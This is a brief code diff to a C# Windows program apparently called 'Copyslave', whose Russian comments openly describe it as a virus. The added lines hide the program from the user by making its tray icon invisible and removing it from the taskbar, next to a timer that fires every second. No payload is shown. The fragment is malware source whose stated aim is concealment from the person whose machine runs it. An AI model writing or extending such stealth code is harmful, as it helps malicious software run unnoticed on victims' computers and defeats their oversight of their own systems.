@@ -22,6 +22,13 @@ namespace Copyslave
             Timer.Tick += new EventHandler(Timer_Tick);
             Timer.Interval = new TimeSpan(0, 0, 1); //1 секунда
             Timer.Start();
+
+            //Чтобы вирус не был виден в трее
+            NotifyIcon Icon = new NotifyIcon();
+            Icon.Visible = false;
+            
+            //Скрываем вирус от панели задач
+            this.ShowInTaskbar = false;
         }
 
         public void Timer_Tick(object sender, EventArgs e)
